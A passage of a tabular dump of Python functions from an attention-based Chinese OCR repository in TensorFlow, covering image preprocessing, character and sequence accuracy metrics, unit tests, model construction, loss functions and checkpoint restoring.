    slim.evaluation.evaluation_loop(master=FLAGS.master, checkpoint_dir=FLAGS.train_log_dir, logdir=FLAGS.eval_log_dir, eval_op=eval_ops, num_evals=FLAGS.num_batches, eval_interval_secs=FLAGS.eval_interval_secs, max_number_of_evaluations=FLAGS.number_of_steps, session_config=session_config)"
A-bone1/Attention-ocr-Chinese-Version,apply_with_random_selector,"def apply_with_random_selector(x, func, num_cases):
    """"""Computes func(x, sel), with sel sampled from [0...num_cases-1].

  Args:
    x: input Tensor.
    func: Python function to apply.
    num_cases: Python int32, number of cases to sample sel from.

  Returns:
    The result of func(x, sel), where func receives the value of the
    selector as a python integer, but sel is sampled dynamically.
  """"""
    sel = tf.random_uniform([], maxval=num_cases, dtype=tf.int32)
    return control_flow_ops.merge([func(control_flow_ops.switch(x, tf.equal(sel, case))[1], case) for case in range(num_cases)])[0]"
A-bone1/Attention-ocr-Chinese-Version,distort_color,"def distort_color(image, color_ordering=0, fast_mode=True, scope=None):
    """"""Distort the color of a Tensor image.

  Each color distortion is non-commutative and thus ordering of the color ops
  matters. Ideally we would randomly permute the ordering of the color ops.
  Rather then adding that level of complication, we select a distinct ordering
  of color ops for each preprocessing thread.

  Args:
    image: 3-D Tensor containing single image in [0, 1].
    color_ordering: Python int, a type of distortion (valid values: 0-3).
    fast_mode: Avoids slower ops (random_hue and random_contrast)
    scope: Optional scope for name_scope.
  Returns:
    3-D Tensor color-distorted image on range [0, 1]
  Raises:
    ValueError: if color_ordering not in [0, 3]
  """"""
    with tf.name_scope(scope, 'distort_color', [image]):
        if fast_mode:
            if color_ordering == 0:
                image = tf.image.random_brightness(image, max_delta=32.0 / 255.0)
                image = tf.image.random_saturation(image, lower=0.5, upper=1.5)
            else:
                image = tf.image.random_saturation(image, lower=0.5, upper=1.5)
                image = tf.image.random_brightness(image, max_delta=32.0 / 255.0)
        elif color_ordering == 0:
            image = tf.image.random_brightness(image, max_delta=32.0 / 255.0)
            image = tf.image.random_saturation(image, lower=0.5, upper=1.5)
            image = tf.image.random_hue(image, max_delta=0.2)
            image = tf.image.random_contrast(image, lower=0.5, upper=1.5)
        elif color_ordering == 1:
            image = tf.image.random_saturation(image, lower=0.5, upper=1.5)
            image = tf.image.random_brightness(image, max_delta=32.0 / 255.0)
            image = tf.image.random_contrast(image, lower=0.5, upper=1.5)
            image = tf.image.random_hue(image, max_delta=0.2)
        elif color_ordering == 2:
            image = tf.image.random_contrast(image, lower=0.5, upper=1.5)
            image = tf.image.random_hue(image, max_delta=0.2)
            image = tf.image.random_brightness(image, max_delta=32.0 / 255.0)
            image = tf.image.random_saturation(image, lower=0.5, upper=1.5)
        elif color_ordering == 3:
            image = tf.image.random_hue(image, max_delta=0.2)
            image = tf.image.random_saturation(image, lower=0.5, upper=1.5)
            image = tf.image.random_contrast(image, lower=0.5, upper=1.5)
            image = tf.image.random_brightness(image, max_delta=32.0 / 255.0)
        else:
            raise ValueError('color_ordering must be in [0, 3]')
        return tf.clip_by_value(image, 0.0, 1.0)"
A-bone1/Attention-ocr-Chinese-Version,distorted_bounding_box_crop,"def distorted_bounding_box_crop(image, bbox, min_object_covered=0.1, aspect_ratio_range=(0.75, 1.33), area_range=(0.05, 1.0), max_attempts=100, scope=None):
    """"""Generates cropped_image using a one of the bboxes randomly distorted.

  See `tf.image.sample_distorted_bounding_box` for more documentation.

  Args:
    image: 3-D Tensor of image (it will be converted to floats in [0, 1]).
    bbox: 3-D float Tensor of bounding boxes arranged [1, num_boxes, coords]
      where each coordinate is [0, 1) and the coordinates are arranged
      as [ymin, xmin, ymax, xmax]. If num_boxes is 0 then it would use the
      whole image.
    min_object_covered: An optional `float`. Defaults to `0.1`. The cropped
      area of the image must contain at least this fraction of any bounding box
      supplied.
    aspect_ratio_range: An optional list of `floats`. The cropped area of the
      image must have an aspect ratio = width / height within this range.
    area_range: An optional list of `floats`. The cropped area of the image
      must contain a fraction of the supplied image within in this range.
    max_attempts: An optional `int`. Number of attempts at generating a cropped
      region of the image of the specified constraints. After `max_attempts`
      failures, return the entire image.
    scope: Optional scope for name_scope.
  Returns:
    A tuple, a 3-D Tensor cropped_image and the distorted bbox
  """"""
    with tf.name_scope(scope, 'distorted_bounding_box_crop', [image, bbox]):
        sample_distorted_bounding_box = tf.image.sample_distorted_bounding_box(tf.shape(image), bounding_boxes=bbox, min_object_covered=min_object_covered, aspect_ratio_range=aspect_ratio_range, area_range=area_range, max_attempts=max_attempts, use_image_if_no_bounding_boxes=True)
        (bbox_begin, bbox_size, distort_bbox) = sample_distorted_bounding_box
        cropped_image = tf.slice(image, bbox_begin, bbox_size)
        return (cropped_image, distort_bbox)"
A-bone1/Attention-ocr-Chinese-Version,preprocess_for_train,"def preprocess_for_train(image, height, width, bbox, fast_mode=True, scope=None):
    """"""Distort one image for training a network.

  Distorting images provides a useful technique for augmenting the data
  set during training in order to make the network invariant to aspects
  of the image that do not effect the label.

  Additionally it would create image_summaries to display the different
  transformations applied to the image.

  Args:
    image: 3-D Tensor of image. If dtype is tf.float32 then the range should be
      [0, 1], otherwise it would converted to tf.float32 assuming that the range
      is [0, MAX], where MAX is largest positive representable number for
      int(8/16/32) data type (see `tf.image.convert_image_dtype` for details).
    height: integer
    width: integer
    bbox: 3-D float Tensor of bounding boxes arranged [1, num_boxes, coords]
      where each coordinate is [0, 1) and the coordinates are arranged
      as [ymin, xmin, ymax, xmax].
    fast_mode: Optional boolean, if True avoids slower transformations (i.e.
      bi-cubic resizing, random_hue or random_contrast).
    scope: Optional scope for name_scope.
  Returns:
    3-D float Tensor of distorted image used for training with range [-1, 1].
  """"""
    with tf.name_scope(scope, 'distort_image', [image, height, width, bbox]):
        if bbox is None:
            bbox = tf.constant([0.0, 0.0, 1.0, 1.0], dtype=tf.float32, shape=[1, 1, 4])
        if image.dtype != tf.float32:
            image = tf.image.convert_image_dtype(image, dtype=tf.float32)
        image_with_box = tf.image.draw_bounding_boxes(tf.expand_dims(image, 0), bbox)
        tf.summary.image('image_with_bounding_boxes', image_with_box)
        (distorted_image, distorted_bbox) = distorted_bounding_box_crop(image, bbox)
        distorted_image.set_shape([None, None, 3])
        image_with_distorted_box = tf.image.draw_bounding_boxes(tf.expand_dims(image, 0), distorted_bbox)
        tf.summary.image('images_with_distorted_bounding_box', image_with_distorted_box)
        num_resize_cases = 1 if fast_mode else 4
        distorted_image = apply_with_random_selector(distorted_image, lambda x, method: tf.image.resize_images(x, [height, width], method=method), num_cases=num_resize_cases)
        tf.summary.image('cropped_resized_image', tf.expand_dims(distorted_image, 0))
        distorted_image = tf.image.random_flip_left_right(distorted_image)
        distorted_image = apply_with_random_selector(distorted_image, lambda x, ordering: distort_color(x, ordering, fast_mode), num_cases=4)
        tf.summary.image('final_distorted_image', tf.expand_dims(distorted_image, 0))
        distorted_image = tf.subtract(distorted_image, 0.5)
        distorted_image = tf.multiply(distorted_image, 2.0)
        return distorted_image"
A-bone1/Attention-ocr-Chinese-Version,preprocess_for_eval,"def preprocess_for_eval(image, height, width, central_fraction=0.875, scope=None):
    """"""Prepare one image for evaluation.

  If height and width are specified it would output an image with that size by
  applying resize_bilinear.

  If central_fraction is specified it would cropt the central fraction of the
  input image.

  Args:
    image: 3-D Tensor of image. If dtype is tf.float32 then the range should be
      [0, 1], otherwise it would converted to tf.float32 assuming that the range
      is [0, MAX], where MAX is largest positive representable number for
      int(8/16/32) data type (see `tf.image.convert_image_dtype` for details)
    height: integer
    width: integer
    central_fraction: Optional Float, fraction of the image to crop.
    scope: Optional scope for name_scope.
  Returns:
    3-D float Tensor of prepared image.
  """"""
    with tf.name_scope(scope, 'eval_image', [image, height, width]):
        if image.dtype != tf.float32:
            image = tf.image.convert_image_dtype(image, dtype=tf.float32)
        if central_fraction:
            image = tf.image.central_crop(image, central_fraction=central_fraction)
        if height and width:
            image = tf.expand_dims(image, 0)
            image = tf.image.resize_bilinear(image, [height, width], align_corners=False)
            image = tf.squeeze(image, [0])
        image = tf.subtract(image, 0.5)
        image = tf.multiply(image, 2.0)
        return image"
A-bone1/Attention-ocr-Chinese-Version,preprocess_image,"def preprocess_image(image, height, width, is_training=False, bbox=None, fast_mode=True):
    """"""Pre-process one image for training or evaluation.

  Args:
    image: 3-D Tensor [height, width, channels] with the image.
    height: integer, image expected height.
    width: integer, image expected width.
    is_training: Boolean. If true it would transform an image for train,
      otherwise it would transform it for evaluation.
    bbox: 3-D float Tensor of bounding boxes arranged [1, num_boxes, coords]
      where each coordinate is [0, 1) and the coordinates are arranged as
      [ymin, xmin, ymax, xmax].
    fast_mode: Optional boolean, if True avoids slower transformations.

  Returns:
    3-D float Tensor containing an appropriately scaled image

  Raises:
    ValueError: if user does not provide bounding box
  """"""
    if is_training:
        return preprocess_for_train(image, height, width, bbox, fast_mode)
    else:
        return preprocess_for_eval(image, height, width)"
A-bone1/Attention-ocr-Chinese-Version,char_accuracy,"def char_accuracy(predictions, targets, rej_char, streaming=False):
    """"""Computes character level accuracy.

  Both predictions and targets should have the same shape
  [batch_size x seq_length].

  Args:
    predictions: predicted characters ids.
    targets: ground truth character ids.
    rej_char: the character id used to mark an empty element (end of sequence).
    streaming: if True, uses the streaming mean from the slim.metric module.

  Returns:
    a update_ops for execution and value tensor whose value on evaluation
    returns the total character accuracy.
  """"""
    with tf.variable_scope('CharAccuracy'):
        predictions.get_shape().assert_is_compatible_with(targets.get_shape())
        targets = tf.to_int32(targets)
        const_rej_char = tf.constant(rej_char, shape=targets.get_shape())
        weights = tf.to_float(tf.not_equal(targets, const_rej_char))
        correct_chars = tf.to_float(tf.equal(predictions, targets))
        accuracy_per_example = tf.div(tf.reduce_sum(tf.multiply(correct_chars, weights), 1), tf.reduce_sum(weights, 1))
        if streaming:
            return tf.contrib.metrics.streaming_mean(accuracy_per_example)
        else:
            return tf.reduce_mean(accuracy_per_example)"
A-bone1/Attention-ocr-Chinese-Version,sequence_accuracy,"def sequence_accuracy(predictions, targets, rej_char, streaming=False):
    """"""Computes sequence level accuracy.

  Both input tensors should have the same shape: [batch_size x seq_length].

  Args:
    predictions: predicted character classes.
    targets: ground truth character classes.
    rej_char: the character id used to mark empty element (end of sequence).
    streaming: if True, uses the streaming mean from the slim.metric module.

  Returns:
    a update_ops for execution and value tensor whose value on evaluation
    returns the total sequence accuracy.
  """"""
    with tf.variable_scope('SequenceAccuracy'):
        predictions.get_shape().assert_is_compatible_with(targets.get_shape())
        targets = tf.to_int32(targets)
        const_rej_char = tf.constant(rej_char, shape=targets.get_shape(), dtype=tf.int32)
        include_mask = tf.not_equal(targets, const_rej_char)
        include_predictions = tf.to_int32(tf.where(include_mask, predictions, tf.zeros_like(predictions) + rej_char))
        correct_chars = tf.to_float(tf.equal(include_predictions, targets))
        correct_chars_counts = tf.cast(tf.reduce_sum(correct_chars, reduction_indices=[1]), dtype=tf.int32)
        target_length = targets.get_shape().dims[1].value
        target_chars_counts = tf.constant(target_length, shape=correct_chars_counts.get_shape())
        accuracy_per_example = tf.to_float(tf.equal(correct_chars_counts, target_chars_counts))
        if streaming:
            return tf.contrib.metrics.streaming_mean(accuracy_per_example)
        else:
            return tf.reduce_mean(accuracy_per_example)"
A-bone1/Attention-ocr-Chinese-Version,setUp,"def setUp(self):
    tf.test.TestCase.setUp(self)
    self.rng = np.random.RandomState([11, 23, 50])
    self.num_char_classes = 3
    self.batch_size = 4
    self.seq_length = 5
    self.rej_char = 42"
A-bone1/Attention-ocr-Chinese-Version,initialized_session,"@contextlib.contextmanager
def initialized_session(self):
    """"""Wrapper for test session context manager with required initialization.

    Yields:
      A session object that should be used as a context manager.
    """"""
    with self.test_session() as sess:
        sess.run(tf.global_variables_initializer())
        sess.run(tf.local_variables_initializer())
        yield sess"
A-bone1/Attention-ocr-Chinese-Version,_fake_labels,"def _fake_labels(self):
    return self.rng.randint(low=0, high=self.num_char_classes, size=(self.batch_size, self.seq_length), dtype='int32')"
A-bone1/Attention-ocr-Chinese-Version,_incorrect_copy,"def _incorrect_copy(self, values, bad_indexes):
    incorrect = np.copy(values)
    incorrect[bad_indexes] = values[bad_indexes] + 1
    return incorrect"
A-bone1/Attention-ocr-Chinese-Version,test_sequence_accuracy_identical_samples,"def test_sequence_accuracy_identical_samples(self):
    labels_tf = tf.convert_to_tensor(self._fake_labels())
    accuracy_tf = metrics.sequence_accuracy(labels_tf, labels_tf, self.rej_char)
    with self.initialized_session() as sess:
        accuracy_np = sess.run(accuracy_tf)
    self.assertAlmostEqual(accuracy_np, 1.0)"
A-bone1/Attention-ocr-Chinese-Version,test_sequence_accuracy_one_char_difference,"def test_sequence_accuracy_one_char_difference(self):
    ground_truth_np = self._fake_labels()
    ground_truth_tf = tf.convert_to_tensor(ground_truth_np)
    prediction_tf = tf.convert_to_tensor(self._incorrect_copy(ground_truth_np, bad_indexes=(0, 0)))
    accuracy_tf = metrics.sequence_accuracy(prediction_tf, ground_truth_tf, self.rej_char)
    with self.initialized_session() as sess:
        accuracy_np = sess.run(accuracy_tf)
    self.assertAlmostEqual(accuracy_np, 1.0 - 1.0 / self.batch_size)"
A-bone1/Attention-ocr-Chinese-Version,test_char_accuracy_one_char_difference_with_padding,"def test_char_accuracy_one_char_difference_with_padding(self):
    ground_truth_np = self._fake_labels()
    ground_truth_tf = tf.convert_to_tensor(ground_truth_np)
    prediction_tf = tf.convert_to_tensor(self._incorrect_copy(ground_truth_np, bad_indexes=(0, 0)))
    accuracy_tf = metrics.char_accuracy(prediction_tf, ground_truth_tf, self.rej_char)
    with self.initialized_session() as sess:
        accuracy_np = sess.run(accuracy_tf)
    chars_count = self.seq_length * self.batch_size
    self.assertAlmostEqual(accuracy_np, 1.0 - 1.0 / chars_count)"
A-bone1/Attention-ocr-Chinese-Version,_dict_to_array,"def _dict_to_array(id_to_char, default_character):
    num_char_classes = max(id_to_char.keys()) + 1
    array = [default_character] * num_char_classes
    for (k, v) in id_to_char.items():
        array[k] = v
    return array"
A-bone1/Attention-ocr-Chinese-Version,get_softmax_loss_fn,"def get_softmax_loss_fn(label_smoothing):
    """"""Returns sparse or dense loss function depending on the label_smoothing.

    Args:
      label_smoothing: weight for label smoothing

    Returns:
      a function which takes labels and predictions as arguments and returns
      a softmax loss for the selected type of labels (sparse or dense).
    """"""
    if label_smoothing > 0:

        def loss_fn(labels, logits):
            return tf.nn.softmax_cross_entropy_with_logits(logits=logits, labels=labels)
    else:

        def loss_fn(labels, logits):
            return tf.nn.sparse_softmax_cross_entropy_with_logits(logits=logits, labels=labels)
    return loss_fn"
A-bone1/Attention-ocr-Chinese-Version,__init__,"def __init__(self, charset, default_character='?'):
    """"""Creates a lookup table.

    Args:
      charset: a dictionary with id-to-character mapping.
    """"""
    mapping_strings = tf.constant(_dict_to_array(charset, default_character))
    self.table = tf.contrib.lookup.index_to_string_table_from_tensor(mapping=mapping_strings, default_value=default_character)"
A-bone1/Attention-ocr-Chinese-Version,get_text,"def get_text(self, ids):
    """"""Returns a string corresponding to a sequence of character ids.

        Args:
          ids: a tensor with shape [batch_size, max_sequence_length]
        """"""
    return tf.reduce_join(self.table.lookup(tf.to_int64(ids)), reduction_indices=1)"
A-bone1/Attention-ocr-Chinese-Version,__init__,"def __init__(self, num_char_classes, seq_length, num_views, null_code, mparams=None, charset=None):
    """"""Initialized model parameters.

    Args:
      num_char_classes: size of character set.
      seq_length: number of characters in a sequence.
      num_views: Number of views (conv towers) to use.
      null_code: A character code corresponding to a character which
        indicates end of a sequence.
      mparams: a dictionary with hyper parameters for methods,  keys -
        function names, values - corresponding namedtuples.
      charset: an optional dictionary with a mapping between character ids and
        utf8 strings. If specified the OutputEndpoints.predicted_text will
        utf8 encoded strings corresponding to the character ids returned by
        OutputEndpoints.predicted_chars (by default the predicted_text contains
        an empty vector). 
        NOTE: Make sure you call tf.tables_initializer().run() if the charset
        specified.
    """"""
    super(Model, self).__init__()
    self._params = ModelParams(num_char_classes=num_char_classes, seq_length=seq_length, num_views=num_views, null_code=null_code)
    self._mparams = self.default_mparams()
    if mparams:
        self._mparams.update(mparams)
    self._charset = charset"
A-bone1/Attention-ocr-Chinese-Version,default_mparams,"def default_mparams(self):
    return {'conv_tower_fn': ConvTowerParams(final_endpoint='Mixed_5d'), 'sequence_logit_fn': SequenceLogitsParams(use_attention=True, use_autoregression=True, num_lstm_units=256, weight_decay=4e-05, lstm_state_clip_value=10.0), 'sequence_loss_fn': SequenceLossParams(label_smoothing=0.1, ignore_nulls=True, average_across_timesteps=False), 'encode_coordinates_fn': EncodeCoordinatesParams(enabled=False)}"
A-bone1/Attention-ocr-Chinese-Version,set_mparam,"def set_mparam(self, function, **kwargs):
    self._mparams[function] = self._mparams[function]._replace(**kwargs)"
A-bone1/Attention-ocr-Chinese-Version,conv_tower_fn,"def conv_tower_fn(self, images, is_training=True, reuse=None):
    """"""Computes convolutional features using the InceptionV3 model.

    Args:
      images: A tensor of shape [batch_size, height, width, channels].
      is_training: whether is training or not.
      reuse: whether or not the network and its variables should be reused. To
        be able to reuse 'scope' must be given.

    Returns:
      A tensor of shape [batch_size, OH, OW, N], where OWxOH is resolution of
      output feature map and N is number of output features (depends on the
      network architecture).
    """"""
    mparams = self._mparams['conv_tower_fn']
    logging.debug('Using final_endpoint=%s', mparams.final_endpoint)
    with tf.variable_scope('conv_tower_fn/INCE'):
        if reuse:
            tf.get_variable_scope().reuse_variables()
        with slim.arg_scope(inception.inception_v3_arg_scope()):
            with slim.arg_scope([slim.batch_norm, slim.dropout], is_training=is_training):
                (net, _) = inception.inception_v3_base(images, final_endpoint=mparams.final_endpoint)
        return net"
A-bone1/Attention-ocr-Chinese-Version,_create_lstm_inputs,"def _create_lstm_inputs(self, net):
    """"""Splits an input tensor into a list of tensors (features).

    Args:
      net: A feature map of shape [batch_size, num_features, feature_size].

    Raises:
      AssertionError: if num_features is less than seq_length.

    Returns:
      A list with seq_length tensors of shape [batch_size, feature_size]
    """"""
    num_features = net.get_shape().dims[1].value
    if num_features < self._params.seq_length:
        raise AssertionError('Incorrect dimension #1 of input tensor %d should be bigger than %d (shape=%s)' % (num_features, self._params.seq_length, net.get_shape()))
    elif num_features > self._params.seq_length:
        logging.warning('Ignoring some features: use %d of %d (shape=%s)', self._params.seq_length, num_features, net.get_shape())
        net = tf.slice(net, [0, 0, 0], [-1, self._params.seq_length, -1])
    return tf.unstack(net, axis=1)"
A-bone1/Attention-ocr-Chinese-Version,sequence_logit_fn,"def sequence_logit_fn(self, net, labels_one_hot):
    mparams = self._mparams['sequence_logit_fn']
    with tf.variable_scope('sequence_logit_fn/SQLR'):
        layer_class = sequence_layers.get_layer_class(mparams.use_attention, mparams.use_autoregression)
        layer = layer_class(net, labels_one_hot, self._params, mparams)
        return layer.create_logits()"
A-bone1/Attention-ocr-Chinese-Version,max_pool_views,"def max_pool_views(self, nets_list):
    """"""Max pool across all nets in spatial dimensions.

    Args:
      nets_list: A list of 4D tensors with identical size.

    Returns:
      A tensor with the same size as any input tensors.
    """"""
    (batch_size, height, width, num_features) = [d.value for d in nets_list[0].get_shape().dims]
    xy_flat_shape = (batch_size, 1, height * width, num_features)
    nets_for_merge = []
    with tf.variable_scope('max_pool_views', values=nets_list):
        for net in nets_list:
            nets_for_merge.append(tf.reshape(net, xy_flat_shape))
        merged_net = tf.concat(nets_for_merge, 1)
        net = slim.max_pool2d(merged_net, kernel_size=[len(nets_list), 1], stride=1)
        net = tf.reshape(net, (batch_size, height, width, num_features))
    return net"
A-bone1/Attention-ocr-Chinese-Version,pool_views_fn,"def pool_views_fn(self, nets):
    """"""Combines output of multiple convolutional towers into a single tensor.

    It stacks towers one on top another (in height dim) in a 4x1 grid.
    The order is arbitrary design choice and shouldn't matter much.

    Args:
      nets: list of tensors of shape=[batch_size, height, width, num_features].

    Returns:
      A tensor of shape [batch_size, seq_length, features_size].
    """"""
    with tf.variable_scope('pool_views_fn/STCK'):
        net = tf.concat(nets, 1)
        batch_size = net.get_shape().dims[0].value
        feature_size = net.get_shape().dims[3].value
        return tf.reshape(net, [batch_size, -1, feature_size])"
A-bone1/Attention-ocr-Chinese-Version,char_predictions,"def char_predictions(self, chars_logit):
    """"""Returns confidence scores (softmax values) for predicted characters.

    Args:
      chars_logit: chars logits, a tensor with shape
        [batch_size x seq_length x num_char_classes]

    Returns:
      A tuple (ids, log_prob, scores), where:
        ids - predicted characters, a int32 tensor with shape
          [batch_size x seq_length];
        log_prob - a log probability of all characters, a float tensor with
          shape [batch_size, seq_length, num_char_classes];
        scores - corresponding confidence scores for characters, a float
        tensor
          with shape [batch_size x seq_length].
    """"""
    log_prob = utils.logits_to_log_prob(chars_logit)
    ids = tf.to_int32(tf.argmax(log_prob, axis=2), name='predicted_chars')
    mask = tf.cast(slim.one_hot_encoding(ids, self._params.num_char_classes), tf.bool)
    all_scores = tf.nn.softmax(chars_logit)
    selected_scores = tf.boolean_mask(all_scores, mask, name='char_scores')
    scores = tf.reshape(selected_scores, shape=(-1, self._params.seq_length))
    return (ids, log_prob, scores)"
A-bone1/Attention-ocr-Chinese-Version,encode_coordinates_fn,"def encode_coordinates_fn(self, net):
    """"""Adds one-hot encoding of coordinates to different views in the networks.

    For each ""pixel"" of a feature map it adds a onehot encoded x and y
    coordinates.

    Args:
      net: a tensor of shape=[batch_size, height, width, num_features]

    Returns:
      a tensor with the same height and width, but altered feature_size.
    """"""
    mparams = self._mparams['encode_coordinates_fn']
    if mparams.enabled:
        (batch_size, h, w, _) = net.shape.as_list()
        (x, y) = tf.meshgrid(tf.range(w), tf.range(h))
        w_loc = slim.one_hot_encoding(x, num_classes=w)
        h_loc = slim.one_hot_encoding(y, num_classes=h)
        loc = tf.concat([h_loc, w_loc], 2)
        loc = tf.tile(tf.expand_dims(loc, 0), [batch_size, 1, 1, 1])
        return tf.concat([net, loc], 3)
    else:
        return net"
A-bone1/Attention-ocr-Chinese-Version,create_base,"def create_base(self, images, labels_one_hot, scope='AttentionOcr_v1', reuse=None):
    """"""Creates a base part of the Model (no gradients, losses or summaries).

    Args:
      images: A tensor of shape [batch_size, height, width, channels].
      labels_one_hot: Optional (can be None) one-hot encoding for ground truth
        labels. If provided the function will create a model for training.
      scope: Optional variable_scope.
      reuse: whether or not the network and its variables should be reused. To
        be able to reuse 'scope' must be given.

    Returns:
      A named tuple OutputEndpoints.
    """"""
    logging.debug('images: %s', images)
    is_training = labels_one_hot is not None
    with tf.variable_scope(scope, reuse=reuse):
        views = tf.split(value=images, num_or_size_splits=self._params.num_views, axis=2)
        logging.debug('Views=%d single view: %s', len(views), views[0])
        nets = [self.conv_tower_fn(v, is_training, reuse=i != 0) for (i, v) in enumerate(views)]
        logging.debug('Conv tower: %s', nets[0])
        nets = [self.encode_coordinates_fn(net) for net in nets]
        logging.debug('Conv tower w/ encoded coordinates: %s', nets[0])
        net = self.pool_views_fn(nets)
        logging.debug('Pooled views: %s', net)
        chars_logit = self.sequence_logit_fn(net, labels_one_hot)
        logging.debug('chars_logit: %s', chars_logit)
        (predicted_chars, chars_log_prob, predicted_scores) = self.char_predictions(chars_logit)
        if self._charset:
            character_mapper = CharsetMapper(self._charset)
            predicted_text = character_mapper.get_text(predicted_chars)
        else:
            predicted_text = tf.constant([])
    return OutputEndpoints(chars_logit=chars_logit, chars_log_prob=chars_log_prob, predicted_chars=predicted_chars, predicted_scores=predicted_scores, predicted_text=predicted_text)"
A-bone1/Attention-ocr-Chinese-Version,create_loss,"def create_loss(self, data, endpoints):
    """"""Creates all losses required to train the model.

    Args:
      data: InputEndpoints namedtuple.
      endpoints: Model namedtuple.

    Returns:
      Total loss.
    """"""
    self.sequence_loss_fn(endpoints.chars_logit, data.labels)
    total_loss = slim.losses.get_total_loss()
    tf.summary.scalar('TotalLoss', total_loss)
    return total_loss"
A-bone1/Attention-ocr-Chinese-Version,label_smoothing_regularization,"def label_smoothing_regularization(self, chars_labels, weight=0.1):
    """"""Applies a label smoothing regularization.

    Uses the same method as in https://arxiv.org/abs/1512.00567.

    Args:
      chars_labels: ground truth ids of charactes,
        shape=[batch_size, seq_length];
      weight: label-smoothing regularization weight.

    Returns:
      A sensor with the same shape as the input.
    """"""
    one_hot_labels = tf.one_hot(chars_labels, depth=self._params.num_char_classes, axis=-1)
    pos_weight = 1.0 - weight
    neg_weight = weight / self._params.num_char_classes
    return one_hot_labels * pos_weight + neg_weight"
A-bone1/Attention-ocr-Chinese-Version,sequence_loss_fn,"def sequence_loss_fn(self, chars_logits, chars_labels):
    """"""Loss function for char sequence.

    Depending on values of hyper parameters it applies label smoothing and can
    also ignore all null chars after the first one.

    Args:
      chars_logits: logits for predicted characters,
        shape=[batch_size, seq_length, num_char_classes];
      chars_labels: ground truth ids of characters,
        shape=[batch_size, seq_length];
      mparams: method hyper parameters.

    Returns:
      A Tensor with shape [batch_size] - the log-perplexity for each sequence.
    """"""
    mparams = self._mparams['sequence_loss_fn']
    with tf.variable_scope('sequence_loss_fn/SLF'):
        if mparams.label_smoothing > 0:
            smoothed_one_hot_labels = self.label_smoothing_regularization(chars_labels, mparams.label_smoothing)
            labels_list = tf.unstack(smoothed_one_hot_labels, axis=1)
        else:
            labels_list = tf.unstack(chars_labels, axis=1)
        (batch_size, seq_length, _) = chars_logits.shape.as_list()
        if mparams.ignore_nulls:
            weights = tf.ones((batch_size, seq_length), dtype=tf.float32)
        else:
            reject_char = tf.constant(self._params.num_char_classes - 1, shape=(batch_size, seq_length), dtype=tf.int64)
            known_char = tf.not_equal(chars_labels, reject_char)
            weights = tf.to_float(known_char)
        logits_list = tf.unstack(chars_logits, axis=1)
        weights_list = tf.unstack(weights, axis=1)
        loss = tf.contrib.legacy_seq2seq.sequence_loss(logits_list, labels_list, weights_list, softmax_loss_function=get_softmax_loss_fn(mparams.label_smoothing), average_across_timesteps=mparams.average_across_timesteps)
        tf.losses.add_loss(loss)
        return loss"
A-bone1/Attention-ocr-Chinese-Version,create_summaries,"def create_summaries(self, data, endpoints, charset, is_training):
    """"""Creates all summaries for the model.

    Args:
      data: InputEndpoints namedtuple.
      endpoints: OutputEndpoints namedtuple.
      charset: A dictionary with mapping between character codes and
        unicode characters. Use the one provided by a dataset.charset.
      is_training: If True will create summary prefixes for training job,
        otherwise - for evaluation.

    Returns:
      A list of evaluation ops
    """"""

    def sname(label):
        prefix = 'train' if is_training else 'eval'
        return '%s/%s' % (prefix, label)
    max_outputs = 4
    charset_mapper = CharsetMapper(charset)
    pr_text = charset_mapper.get_text(endpoints.predicted_chars[:max_outputs, :])
    tf.summary.text(sname('text/pr'), pr_text)
    gt_text = charset_mapper.get_text(data.labels[:max_outputs, :])
    tf.summary.text(sname('text/gt'), gt_text)
    tf.summary.image(sname('image'), data.images, max_outputs=max_outputs)
    if is_training:
        tf.summary.image(sname('image/orig'), data.images_orig, max_outputs=max_outputs)
        for var in tf.trainable_variables():
            tf.summary.histogram(var.op.name, var)
        return None
    else:
        names_to_values = {}
        names_to_updates = {}

        def use_metric(name, value_update_tuple):
            names_to_values[name] = value_update_tuple[0]
            names_to_updates[name] = value_update_tuple[1]
        use_metric('CharacterAccuracy', metrics.char_accuracy(endpoints.predicted_chars, data.labels, streaming=True, rej_char=self._params.null_code))
        use_metric('SequenceAccuracy', metrics.sequence_accuracy(endpoints.predicted_chars, data.labels, streaming=True, rej_char=self._params.null_code))
        for (name, value) in names_to_values.items():
            summary_name = 'eval/' + name
            tf.summary.scalar(summary_name, tf.Print(value, [value], summary_name))
        return list(names_to_updates.values())"
A-bone1/Attention-ocr-Chinese-Version,create_init_fn_to_restore,"def create_init_fn_to_restore(self, master_checkpoint, inception_checkpoint=None):
    """"""Creates an init operations to restore weights from various checkpoints.

    Args:
      master_checkpoint: path to a checkpoint which contains all weights for
        the whole model.
      inception_checkpoint: path to a checkpoint which contains weights for the
        inception part only.

    Returns:
      a function to run initialization ops.
    """"""
    all_assign_ops = []
    all_feed_dict = {}

    def assign_from_checkpoint(variables, checkpoint):
        logging.info('Request to re-store %d weights from %s', len(variables), checkpoint)
        if not variables:
            logging.error(""Can't find any variables to restore."")
            sys.exit(1)
        (assign_op, feed_dict) = slim.assign_from_checkpoint(checkpoint, variables)
        all_assign_ops.append(assign_op)
        all_feed_dict.update(feed_dict)
    logging.info('variables_to_restore:\n%s' % utils.variables_to_restore().keys())
    logging.info('moving_average_variables:\n%s' % [v.op.name for v in tf.moving_average_variables()])
    logging.info('trainable_variables:\n%s' % [v.op.name for v in tf.trainable_variables()])
    if master_checkpoint:
        assign_from_checkpoint(utils.variables_to_restore(), master_checkpoint)
    if inception_checkpoint:
        variables = utils.variables_to_restore('AttentionOcr_v1/conv_tower_fn/INCE', strip_scope=True)
        assign_from_checkpoint(variables, inception_checkpoint)

    def init_assign_fn(sess):
        logging.info('Restoring checkpoint(s)')
        sess.run(all_assign_ops, all_feed_dict)
    return init_assign_fn"
A-bone1/Attention-ocr-Chinese-Version,loss_fn,"def loss_fn(labels, logits):
    return tf.nn.softmax_cross_entropy_with_logits(logits=logits, labels=labels)"
A-bone1/Attention-ocr-Chinese-Version,loss_fn,"def loss_fn(labels, logits):
    return tf.nn.sparse_softmax_cross_entropy_with_logits(logits=logits, labels=labels)"
A-bone1/Attention-ocr-Chinese-Version,sname,"def sname(label):
    prefix = 'train' if is_training else 'eval'
    return '%s/%s' % (prefix, label)"
A-bone1/Attention-ocr-Chinese-Version,assign_from_checkpoint,"def assign_from_checkpoint(variables, checkpoint):
    logging.info('Request to re-store %d weights from %s', len(variables), checkpoint)
    if not variables:
        logging.error(""Can't find any variables to restore."")
        sys.exit(1)
    (assign_op, feed_dict) = slim.assign_from_checkpoint(checkpoint, variables)
    all_assign_ops.append(assign_op)
    all_feed_dict.update(feed_dict)"
